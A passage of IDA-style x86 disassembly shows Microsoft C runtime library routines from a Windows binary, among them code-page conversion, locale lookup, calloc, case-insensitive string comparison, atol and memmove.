loc_100B2F1:				; CODE XREF: ___ansicp+2Aj
		lea	eax, [ebp+Str]
		push	eax		; Str
		call	_atol
		pop	ecx

loc_100B2FB:				; CODE XREF: ___ansicp+2Fj
		mov	ecx, [ebp+var_4]
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
___ansicp	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __convertcp(UINT CodePage, int, LPCSTR lpMultiByteStr, int, int, int)
___convertcp	proc near		; CODE XREF: ___crtLCMapStringA+2ABp
					; ___crtLCMapStringA+379p ...

var_54		= dword	ptr -54h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
cbMultiByte	= dword	ptr -44h
var_40		= dword	ptr -40h
var_3C		= dword	ptr -3Ch
var_38		= dword	ptr -38h
Memory		= dword	ptr -34h
CPInfo		= _cpinfo ptr -30h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
CodePage	= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpMultiByteStr	= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	44h
		push	offset stru_10036B8
		call	__SEH_prolog
		mov	eax, ___security_cookie
		mov	[ebp+var_1C], eax
		mov	ebx, [ebp+lpMultiByteStr]
		mov	[ebp+var_54], ebx
		mov	eax, [ebp+arg_C]
		mov	[ebp+var_4C], eax
		mov	ecx, [ebp+arg_10]
		mov	[ebp+var_40], ecx
		xor	ecx, ecx
		mov	[ebp+Memory], ecx
		mov	[ebp+var_48], ecx
		mov	edi, [eax]
		mov	[ebp+cbMultiByte], edi
		mov	[ebp+var_38], ecx
		mov	eax, [ebp+CodePage]
		cmp	eax, [ebp+arg_4]
		jz	loc_100B4D0
		lea	ecx, [ebp+CPInfo]
		push	ecx		; lpCPInfo
		push	eax		; CodePage
		mov	esi, ds:__imp__GetCPInfo@8 ; GetCPInfo(x,x)
		call	esi ; GetCPInfo(x,x) ; GetCPInfo(x,x)
		test	eax, eax
		jz	short loc_100B37B
		cmp	[ebp+CPInfo.MaxCharSize], 1
		jnz	short loc_100B37B
		lea	eax, [ebp+CPInfo]
		push	eax		; lpCPInfo
		push	[ebp+arg_4]	; CodePage
		call	esi ; GetCPInfo(x,x) ; GetCPInfo(x,x)
		test	eax, eax
		jz	short loc_100B37B
		xor	eax, eax
		inc	eax
		cmp	[ebp+CPInfo.MaxCharSize], eax
		jnz	short loc_100B37B
		mov	[ebp+var_38], eax

loc_100B37B:				; CODE XREF: ___convertcp+51j
					; ___convertcp+57j ...
		cmp	[ebp+var_38], 0
		jz	short loc_100B3A0
		cmp	edi, 0FFFFFFFFh
		jz	short loc_100B38A
		mov	esi, edi
		jmp	short loc_100B39B
; ---------------------------------------------------------------------------

loc_100B38A:				; CODE XREF: ___convertcp+7Aj
		mov	eax, ebx
		lea	edx, [eax+1]

loc_100B38F:				; CODE XREF: ___convertcp+8Aj
		mov	cl, [eax]
		inc	eax
		test	cl, cl
		jnz	short loc_100B38F
		sub	eax, edx
		lea	esi, [eax+1]

loc_100B39B:				; CODE XREF: ___convertcp+7Ej
		mov	[ebp+var_3C], esi
		jmp	short loc_100B3A3
; ---------------------------------------------------------------------------

loc_100B3A0:				; CODE XREF: ___convertcp+75j
		mov	esi, [ebp+var_3C]

loc_100B3A3:				; CODE XREF: ___convertcp+94j
		xor	eax, eax
		cmp	[ebp+var_38], eax
		jnz	short loc_100B3C2
		push	eax		; cchWideChar
		push	eax		; lpWideCharStr
		push	edi		; cbMultiByte
		push	ebx		; lpMultiByteStr
		push	1		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		mov	esi, eax
		mov	[ebp+var_3C], esi
		test	esi, esi
		jz	short loc_100B421

loc_100B3C2:				; CODE XREF: ___convertcp+9Ej
		and	[ebp+ms_exc.disabled], 0
		lea	edi, [esi+esi]
		mov	eax, edi
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	ebx, esp
		mov	[ebp+var_50], ebx
		mov	ecx, edi
		xor	eax, eax
		mov	edi, ebx
		mov	edx, ecx
		shr	ecx, 2
		rep stosd
		mov	ecx, edx
		and	ecx, 3
		rep stosb
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_100B40D
; ---------------------------------------------------------------------------

loc_100B3F8:				; DATA XREF: .text:stru_10036B8o
		xor	eax, eax	; Exception filter 0 for function 100B30A
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_100B3FC:				; DATA XREF: .text:stru_10036B8o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 100B30A
		call	__resetstkoflw
		xor	ebx, ebx
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	esi, [ebp+var_3C]

loc_100B40D:				; CODE XREF: ___convertcp+ECj
		test	ebx, ebx
		jnz	short loc_100B42F
		push	esi		; SizeOfElements
		push	2		; NumOfElements
		call	_calloc
		pop	ecx
		pop	ecx
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_100B428

loc_100B421:				; CODE XREF: ___convertcp+B6j
		xor	eax, eax
		jmp	loc_100B4E3
; ---------------------------------------------------------------------------

loc_100B428:				; CODE XREF: ___convertcp+115j
		mov	[ebp+var_48], 1

loc_100B42F:				; CODE XREF: ___convertcp+105j
		push	esi		; cchWideChar
		push	ebx		; lpWideCharStr
		push	[ebp+cbMultiByte] ; cbMultiByte
		push	[ebp+var_54]	; lpMultiByteStr
		push	1		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		test	eax, eax
		jz	loc_100B4D3
		xor	edi, edi
		cmp	[ebp+var_40], edi
		jz	short loc_100B471
		push	edi		; lpUsedDefaultChar
		push	edi		; lpDefaultChar
		push	[ebp+arg_14]	; cbMultiByte
		push	[ebp+var_40]	; lpMultiByteStr
		push	esi		; cchWideChar
		push	ebx		; lpWideCharStr
		push	edi		; dwFlags
		push	[ebp+arg_4]	; CodePage
		call	ds:__imp__WideCharToMultiByte@32 ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		test	eax, eax
		jz	short loc_100B4D3
		mov	eax, [ebp+var_40]
		mov	[ebp+Memory], eax
		jmp	short loc_100B4D3
; ---------------------------------------------------------------------------

loc_100B471:				; CODE XREF: ___convertcp+145j
		cmp	[ebp+var_38], edi
		jnz	short loc_100B48E
		push	edi		; lpUsedDefaultChar
		push	edi		; lpDefaultChar
		push	edi		; cbMultiByte
		push	edi		; lpMultiByteStr
		push	esi		; cchWideChar
		push	ebx		; lpWideCharStr
		push	edi		; dwFlags
		push	[ebp+arg_4]	; CodePage
		call	ds:__imp__WideCharToMultiByte@32 ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		mov	esi, eax
		cmp	esi, edi
		jz	short loc_100B4D3
		xor	edi, edi

loc_100B48E:				; CODE XREF: ___convertcp+16Aj
		push	esi		; SizeOfElements
		push	1		; NumOfElements
		call	_calloc
		pop	ecx
		pop	ecx
		mov	[ebp+Memory], eax
		cmp	eax, edi
		jz	short loc_100B4D3
		xor	edi, edi
		push	edi		; lpUsedDefaultChar
		push	edi		; lpDefaultChar
		push	esi		; cbMultiByte
		push	eax		; lpMultiByteStr
		push	esi		; cchWideChar
		push	ebx		; lpWideCharStr
		push	edi		; dwFlags
		push	[ebp+arg_4]	; CodePage
		call	ds:__imp__WideCharToMultiByte@32 ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		cmp	eax, edi
		jnz	short loc_100B4C3
		push	[ebp+Memory]	; Memory
		call	_free
		pop	ecx
		mov	[ebp+Memory], edi
		jmp	short loc_100B4D3
; ---------------------------------------------------------------------------

loc_100B4C3:				; CODE XREF: ___convertcp+1A9j
		cmp	[ebp+cbMultiByte], 0FFFFFFFFh
		jz	short loc_100B4D3
		mov	ecx, [ebp+var_4C]
		mov	[ecx], eax
		jmp	short loc_100B4D3
; ---------------------------------------------------------------------------

loc_100B4D0:				; CODE XREF: ___convertcp+3Cj
		mov	ebx, [ebp+var_50]

loc_100B4D3:				; CODE XREF: ___convertcp+13Aj
					; ___convertcp+15Dj ...
		cmp	[ebp+var_48], 0
		jz	short loc_100B4E0
		push	ebx		; Memory
		call	_free
		pop	ecx

loc_100B4E0:				; CODE XREF: ___convertcp+1CDj
		mov	eax, [ebp+Memory]

loc_100B4E3:				; CODE XREF: ___convertcp+119j
		lea	esp, [ebp-60h]
		mov	ecx, [ebp+var_1C]
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		call	__SEH_epilog
		retn
___convertcp	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _resetstkoflw()
__resetstkoflw	proc near		; CODE XREF: ___crtLCMapStringA+FEp
					; ___crtLCMapStringA+1CDp ...

SystemInfo	= _SYSTEM_INFO ptr -44h
Buffer		= _MEMORY_BASIC_INFORMATION ptr	-20h
flOldProtect	= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 44h
		push	ebx
		push	esi
		push	edi
		push	4
		pop	eax
		call	__chkstk
		mov	ebx, esp
		push	1Ch		; dwLength
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	ebx		; lpAddress
		call	ds:__imp__VirtualQuery@12 ; VirtualQuery(x,x,x)
		test	eax, eax
		jz	short loc_100B55F
		mov	edi, [ebp+Buffer.AllocationBase]
		lea	eax, [ebp+SystemInfo]
		push	eax		; lpSystemInfo
		call	ds:__imp__GetSystemInfo@4 ; GetSystemInfo(x)
		mov	eax, __osplatform
		mov	esi, [ebp+SystemInfo.dwPageSize]
		mov	ecx, eax
		dec	ecx
		neg	ecx
		sbb	ecx, ecx
		lea	edx, [esi-1]
		and	ecx, 103h
		not	edx
		and	edx, ebx
		inc	ecx
		sub	edx, esi
		dec	eax
		neg	eax
		sbb	eax, eax
		and	eax, 0FFFFFFF1h
		add	eax, 11h
		imul	eax, esi
		add	eax, edi
		cmp	edx, eax
		jnb	short loc_100B563

loc_100B55F:				; CODE XREF: __resetstkoflw+24j
		xor	eax, eax
		jmp	short loc_100B570
; ---------------------------------------------------------------------------

loc_100B563:				; CODE XREF: __resetstkoflw+64j
		lea	eax, [ebp+flOldProtect]
		push	eax		; lpflOldProtect
		push	ecx		; flNewProtect
		push	esi		; dwSize
		push	edx		; lpAddress
		call	ds:__imp__VirtualProtect@16 ; VirtualProtect(x,x,x,x)

loc_100B570:				; CODE XREF: __resetstkoflw+68j
		lea	esp, [ebp-50h]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
__resetstkoflw	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __getlocaleinfo(int, LCID	Locale,	LCTYPE LCType, int)
___getlocaleinfo proc near		; CODE XREF: sub_100851F+31p
					; sub_100851F+42p ...

var_8C		= dword	ptr -8Ch
var_88		= dword	ptr -88h
Memory		= byte ptr -84h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Locale		= dword	ptr  0Ch
LCType		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 8Ch
		cmp	[ebp+arg_0], 1
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_C]
		mov	[ebp+var_4], eax
		mov	[ebp+var_8C], edi
		jnz	loc_100B66F
		xor	edi, edi
		push	edi		; CodePage
		lea	ebx, [ebp+Memory]
		push	80h		; cchData
		mov	eax, ebx
		push	eax		; lpLCData
		push	[ebp+LCType]	; LCType
		mov	[ebp+var_88], edi
		push	[ebp+Locale]	; Locale
		call	___crtGetLocaleInfoA
		mov	esi, eax
		add	esp, 14h
		cmp	esi, edi
		jnz	short loc_100B621
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 7Ah
		jnz	short loc_100B643
		push	edi		; CodePage
		push	edi		; cchData
		push	edi		; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	___crtGetLocaleInfoA
		mov	esi, eax
		add	esp, 14h
		cmp	esi, edi
		jz	short loc_100B643
		push	esi		; Size
		call	_malloc
		mov	ebx, eax
		cmp	ebx, edi
		pop	ecx
		jz	short loc_100B643
		push	edi		; CodePage
		push	esi		; cchData
		push	ebx		; lpLCData
		push	[ebp+LCType]	; LCType
		mov	[ebp+var_88], 1
		push	[ebp+Locale]	; Locale
		call	___crtGetLocaleInfoA
		mov	esi, eax
		add	esp, 14h
		cmp	esi, edi
		jz	short loc_100B63C

loc_100B621:				; CODE XREF: ___getlocaleinfo+52j
		push	esi		; Size
		call	_malloc
		cmp	eax, edi
		pop	ecx
		mov	ecx, [ebp+var_8C]
		mov	[ecx], eax
		jnz	short loc_100B653
		cmp	[ebp+var_88], edi
		jz	short loc_100B643

loc_100B63C:				; CODE XREF: ___getlocaleinfo+A2j
		push	ebx		; Memory
		call	_free
		pop	ecx

loc_100B643:				; CODE XREF: ___getlocaleinfo+5Dj
					; ___getlocaleinfo+74j	...
		or	eax, 0FFFFFFFFh

loc_100B646:				; CODE XREF: ___getlocaleinfo+15Aj
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
; ---------------------------------------------------------------------------

loc_100B653:				; CODE XREF: ___getlocaleinfo+B5j
		push	esi		; Count
		push	ebx		; Source
		push	eax		; Dest
		call	_strncpy
		add	esp, 0Ch
		cmp	[ebp+var_88], edi
		jz	short loc_100B6D5
		push	ebx		; Memory
		call	_free
		pop	ecx
		jmp	short loc_100B6D5
; ---------------------------------------------------------------------------

loc_100B66F:				; CODE XREF: ___getlocaleinfo+23j
		cmp	[ebp+arg_0], 0
		jnz	short loc_100B643
		push	0		; CodePage
		push	4		; cchWideChar
		mov	esi, offset WideCharStr
		push	esi		; lpWideCharStr
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	___crtGetLocaleInfoW
		add	esp, 14h
		test	eax, eax
		jz	short loc_100B643
		mov	byte ptr [edi],	0

loc_100B694:				; CODE XREF: ___getlocaleinfo+156j
		cmp	___mb_cur_max, 1
		mov	bl, [esi]
		movzx	eax, bl
		jle	short loc_100B6AE
		push	4		; Type
		push	eax		; C
		call	__isctype
		pop	ecx
		pop	ecx
		jmp	short loc_100B6BB
; ---------------------------------------------------------------------------

loc_100B6AE:				; CODE XREF: ___getlocaleinfo+123j
		mov	ecx, __pctype
		movzx	eax, byte ptr [ecx+eax*2]
		and	eax, 4

loc_100B6BB:				; CODE XREF: ___getlocaleinfo+12Fj
		test	eax, eax
		jz	short loc_100B6D5
		mov	al, [edi]
		mov	cl, 0Ah
		imul	cl
		add	al, bl
		sub	al, 30h
		inc	esi
		inc	esi
		cmp	esi, offset ___lconv_static_null
		mov	[edi], al
		jl	short loc_100B694

loc_100B6D5:				; CODE XREF: ___getlocaleinfo+E7j
					; ___getlocaleinfo+F0j	...
		xor	eax, eax
		jmp	loc_100B646
___getlocaleinfo endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void *__cdecl	calloc(size_t NumOfElements, size_t SizeOfElements)
_calloc		proc near		; CODE XREF: ___init_time+11p
					; ___init_numeric+45p ...

NumOfElements	= dword	ptr  8
SizeOfElements	= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+NumOfElements]
		test	ecx, ecx
		jz	short loc_100B6FD
		push	0FFFFFFE0h
		xor	edx, edx
		pop	eax
		div	ecx
		cmp	eax, [ebp+SizeOfElements]
		jnb	short loc_100B6FD
		xor	eax, eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100B6FD:				; CODE XREF: _calloc+Aj _calloc+16j
		imul	ecx, [ebp+SizeOfElements]
		push	esi
		mov	esi, ecx
		test	esi, esi
		push	edi
		mov	edi, esi
		jnz	short loc_100B70C
		inc	esi

loc_100B70C:				; CODE XREF: _calloc+28j _calloc+7Dj
		xor	edx, edx
		cmp	esi, 0FFFFFFE0h
		ja	short loc_100B74C
		cmp	___active_heap,	3
		jnz	short loc_100B737
		add	esi, 0Fh
		and	esi, 0FFFFFFF0h
		cmp	edi, ___sbh_threshold
		ja	short loc_100B737
		push	edi
		call	___sbh_alloc_block
		mov	edx, eax
		test	edx, edx
		pop	ecx
		jnz	short loc_100B762

loc_100B737:				; CODE XREF: _calloc+39j _calloc+47j
		push	esi		; dwBytes
		push	8		; dwFlags
		push	__crtheap	; hHeap
		call	ds:__imp__HeapAlloc@12 ; HeapAlloc(x,x,x)
		mov	edx, eax
		test	edx, edx
		jnz	short loc_100B776

loc_100B74C:				; CODE XREF: _calloc+30j
		cmp	__newmode, 0
		jz	short loc_100B776
		push	esi
		call	__callnewh
		test	eax, eax
		pop	ecx
		jnz	short loc_100B70C
		jmp	short loc_100B778
; ---------------------------------------------------------------------------

loc_100B762:				; CODE XREF: _calloc+54j
		mov	ecx, edi
		mov	esi, ecx
		shr	ecx, 2
		xor	eax, eax
		mov	edi, edx
		rep stosd
		mov	ecx, esi
		and	ecx, 3
		rep stosb

loc_100B776:				; CODE XREF: _calloc+69j _calloc+72j
		mov	eax, edx

loc_100B778:				; CODE XREF: _calloc+7Fj
		pop	edi
		pop	esi
		pop	ebp
		retn
_calloc		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _stricmp(const char *Str1, const char *Str2)
__stricmp	proc near		; CODE XREF: _TranslateName+2Fp
					; LocaleEnumProc+53p ...

Str1		= dword	ptr  8
Str2		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	dword_10106FC, 0
		jnz	short loc_100B795
		pop	ebp
		jmp	___ascii_stricmp
; ---------------------------------------------------------------------------

loc_100B795:				; CODE XREF: __stricmp+Cj
		push	ebx
		push	esi
		mov	esi, [ebp+Str1]
		push	edi
		mov	edi, [ebp+Str2]

loc_100B79E:				; CODE XREF: __stricmp+3Dj
		movzx	eax, byte ptr [esi]
		push	eax		; C
		call	_tolower
		mov	ebx, eax
		movzx	eax, byte ptr [edi]
		push	eax		; C
		inc	esi
		call	_tolower
		pop	ecx
		inc	edi
		test	ebx, ebx
		pop	ecx
		mov	ecx, eax
		jz	short loc_100B7C0
		cmp	ebx, ecx
		jz	short loc_100B79E

loc_100B7C0:				; CODE XREF: __stricmp+39j
		pop	edi
		mov	eax, ebx
		pop	esi
		sub	eax, ecx
		pop	ebx
		pop	ebp
		retn
__stricmp	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl atol(const char *Str)
_atol		proc near		; CODE XREF: sub_1009299+67p
					; ___ansicp+35p

Str		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+Str]
		test	esi, esi
		jnz	short loc_100B7DF
		xor	eax, eax
		jmp	short loc_100B84B
; ---------------------------------------------------------------------------

loc_100B7DF:				; CODE XREF: _atol+Bj _atol+3Bj
		cmp	___mb_cur_max, 1
		movzx	eax, byte ptr [esi]
		jle	short loc_100B7F7
		push	8		; Type
		push	eax		; C
		call	__isctype
		pop	ecx
		pop	ecx
		jmp	short loc_100B804
; ---------------------------------------------------------------------------

loc_100B7F7:				; CODE XREF: _atol+1Bj
		mov	ecx, __pctype
		movzx	eax, byte ptr [ecx+eax*2]
		and	eax, 8

loc_100B804:				; CODE XREF: _atol+27j
		test	eax, eax
		jz	short loc_100B80B
		inc	esi
		jmp	short loc_100B7DF
; ---------------------------------------------------------------------------

loc_100B80B:				; CODE XREF: _atol+38j
		movzx	ecx, byte ptr [esi]
		inc	esi
		cmp	ecx, 2Dh
		mov	edx, ecx
		jz	short loc_100B81B
		cmp	ecx, 2Bh
		jnz	short loc_100B81F

loc_100B81B:				; CODE XREF: _atol+46j
		movzx	ecx, byte ptr [esi]
		inc	esi

loc_100B81F:				; CODE XREF: _atol+4Bj
		xor	eax, eax

loc_100B821:				; CODE XREF: _atol+74j
		cmp	ecx, 30h
		jl	short loc_100B830
		cmp	ecx, 39h
		jg	short loc_100B830
		sub	ecx, 30h
		jmp	short loc_100B833
; ---------------------------------------------------------------------------

loc_100B830:				; CODE XREF: _atol+56j	_atol+5Bj
		or	ecx, 0FFFFFFFFh

loc_100B833:				; CODE XREF: _atol+60j
		cmp	ecx, 0FFFFFFFFh
		jz	short loc_100B844
		lea	eax, [eax+eax*4]
		lea	eax, [ecx+eax*2]
		movzx	ecx, byte ptr [esi]
		inc	esi
		jmp	short loc_100B821
; ---------------------------------------------------------------------------

loc_100B844:				; CODE XREF: _atol+68j
		cmp	edx, 2Dh
		jnz	short loc_100B84B
		neg	eax

loc_100B84B:				; CODE XREF: _atol+Fj _atol+79j
		pop	esi
		pop	ebp
		retn
_atol		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _strnicmp(const char *Str1, const	char *Str2, size_t MaxCount)
__strnicmp	proc near		; CODE XREF: sub_100959B+D7p
					; sub_100959B+1F5p ...

Str1		= dword	ptr  8
Str2		= dword	ptr  0Ch
MaxCount	= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	[ebp+MaxCount],	0
		jz	short loc_100B8A6
		cmp	dword_10106FC, 0
		jnz	short loc_100B86D
		pop	ebp
		jmp	___ascii_strnicmp
; ---------------------------------------------------------------------------

loc_100B86D:				; CODE XREF: __strnicmp+12j
		push	ebx
		push	esi
		mov	esi, [ebp+Str1]
		push	edi
		mov	edi, [ebp+Str2]

loc_100B876:				; CODE XREF: __strnicmp+48j
		movzx	eax, byte ptr [esi]
		push	eax		; C
		call	_tolower
		mov	ebx, eax
		movzx	eax, byte ptr [edi]
		push	eax		; C
		inc	esi
		call	_tolower
		pop	ecx
		inc	edi
		dec	[ebp+MaxCount]
		pop	ecx
		mov	ecx, eax
		jz	short loc_100B89D
		test	ebx, ebx
		jz	short loc_100B89D
		cmp	ebx, ecx
		jz	short loc_100B876

loc_100B89D:				; CODE XREF: __strnicmp+40j
					; __strnicmp+44j
		pop	edi
		mov	eax, ebx
		pop	esi
		sub	eax, ecx
		pop	ebx
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100B8A6:				; CODE XREF: __strnicmp+9j
		xor	eax, eax
		pop	ebp
		retn
__strnicmp	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)
; [00000044 BYTES: COLLAPSED FUNCTION xtoa(x,x,x,x). PRESS KEYPAD "+" TO EXPAND]
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; char *__cdecl	_itoa(int Value, char *Dest, int Radix)
__itoa		proc near		; CODE XREF: ___get_qualified_locale+1AEp

Value		= dword	ptr  8
Dest		= dword	ptr  0Ch
Radix		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		cmp	[ebp+Radix], 0Ah
		mov	eax, [ebp+Value]
		jnz	short loc_100B910
		test	eax, eax
		jge	short loc_100B910
		push	1
		push	0Ah
		jmp	short loc_100B915
; ---------------------------------------------------------------------------

loc_100B910:				; CODE XREF: __itoa+Cj	__itoa+10j
		push	0
		push	[ebp+Radix]

loc_100B915:				; CODE XREF: __itoa+16j
		mov	ecx, [ebp+Dest]
		call	_xtoa@16	; xtoa(x,x,x,x)
		mov	eax, [ebp+Dest]
		pop	ebp
		retn
__itoa		endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; void *__cdecl	memmove(void *Dst, const void *Src, size_t Size)
_memmove	proc near		; CODE XREF: ___sbh_free_block+2E0p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		mov	esi, [ebp+arg_4]
		mov	ecx, [ebp+arg_8]
		mov	edi, [ebp+arg_0]
		mov	eax, ecx
		mov	edx, ecx
		add	eax, esi
		cmp	edi, esi
		jbe	short loc_100B950
		cmp	edi, eax
		jb	loc_100BAC8

loc_100B950:				; CODE XREF: _memmove+16j
		test	edi, 3
		jnz	short loc_100B96C
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_100B98C
		rep movsd
		jmp	ds:off_100BA78[edx*4]
; ---------------------------------------------------------------------------

loc_100B96C:				; CODE XREF: _memmove+26j
		mov	eax, edi
		mov	edx, 3
		sub	ecx, 4
		jb	short loc_100B984
		and	eax, 3
		add	ecx, eax
		jmp	dword ptr ds:loc_100B98C+4[eax*4]
; ---------------------------------------------------------------------------

loc_100B984:				; CODE XREF: _memmove+46j
		jmp	dword ptr ds:loc_100BA88[ecx*4]
; ---------------------------------------------------------------------------
		align 4

loc_100B98C:				; CODE XREF: _memmove+31j _memmove+8Ej ...
		jmp	ds:off_100BA0C[ecx*4]
; ---------------------------------------------------------------------------
		align 4
		mov	al, ds:0CC0100B9h
		mov	ecx, 0B9F00100h
		add	[ecx], al
		and	edx, ecx
		mov	al, [esi]
		mov	[edi], al
		mov	al, [esi+1]
		mov	[edi+1], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		add	esi, 3
		add	edi, 3
		cmp	ecx, 8
		jb	short loc_100B98C
		rep movsd
		jmp	ds:off_100BA78[edx*4]
; ---------------------------------------------------------------------------
		align 4
		and	edx, ecx
		mov	al, [esi]
		mov	[edi], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		add	esi, 2
		add	edi, 2
		cmp	ecx, 8
		jb	short loc_100B98C
		rep movsd
		jmp	ds:off_100BA78[edx*4]
; ---------------------------------------------------------------------------
		align 10h
		and	edx, ecx
		mov	al, [esi]
		mov	[edi], al
		inc	esi
		shr	ecx, 2
		inc	edi
		cmp	ecx, 8
		jb	short loc_100B98C
		rep movsd
		jmp	ds:off_100BA78[edx*4]
; ---------------------------------------------------------------------------
		align 4
off_100BA0C	dd offset loc_100BA6F	; DATA XREF: _memmove:loc_100B98Cr
		dd offset loc_100BA5C
		dd offset loc_100BA54
		dd offset loc_100BA4C
		dd offset loc_100BA44
		dd offset loc_100BA3C
		dd offset loc_100BA34
		dd offset loc_100BA2C
; ---------------------------------------------------------------------------

loc_100BA2C:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+F8o
		mov	eax, [esi+ecx*4-1Ch]
		mov	[edi+ecx*4-1Ch], eax

loc_100BA34:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+F4o
		mov	eax, [esi+ecx*4-18h]
		mov	[edi+ecx*4-18h], eax

loc_100BA3C:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+F0o
		mov	eax, [esi+ecx*4-14h]
		mov	[edi+ecx*4-14h], eax

loc_100BA44:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+ECo
		mov	eax, [esi+ecx*4-10h]
		mov	[edi+ecx*4-10h], eax

loc_100BA4C:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+E8o
		mov	eax, [esi+ecx*4-0Ch]
		mov	[edi+ecx*4-0Ch], eax

loc_100BA54:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+E4o
		mov	eax, [esi+ecx*4-8]
		mov	[edi+ecx*4-8], eax

loc_100BA5C:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove+E0o
		mov	eax, [esi+ecx*4-4]
		mov	[edi+ecx*4-4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

loc_100BA6F:				; CODE XREF: _memmove:loc_100B98Cj
					; DATA XREF: _memmove:off_100BA0Co
		jmp	ds:off_100BA78[edx*4]
; ---------------------------------------------------------------------------
		align 4
off_100BA78	dd offset loc_100BA88	; DATA XREF: _memmove+35r _memmove+92r ...
		dd offset loc_100BA90
		dd offset loc_100BA9C
		dd offset loc_100BAB0
; ---------------------------------------------------------------------------

loc_100BA88:				; CODE XREF: _memmove+35j _memmove+92j ...
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 10h

loc_100BA90:				; CODE XREF: _memmove+35j _memmove+92j ...
		mov	al, [esi]
		mov	[edi], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 4

loc_100BA9C:				; CODE XREF: _memmove+35j _memmove+92j ...
		mov	al, [esi]
		mov	[edi], al
		mov	al, [esi+1]
		mov	[edi+1], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 10h

loc_100BAB0:				; CODE XREF: _memmove+35j _memmove+92j ...
		mov	al, [esi]
		mov	[edi], al
		mov	al, [esi+1]
		mov	[edi+1], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
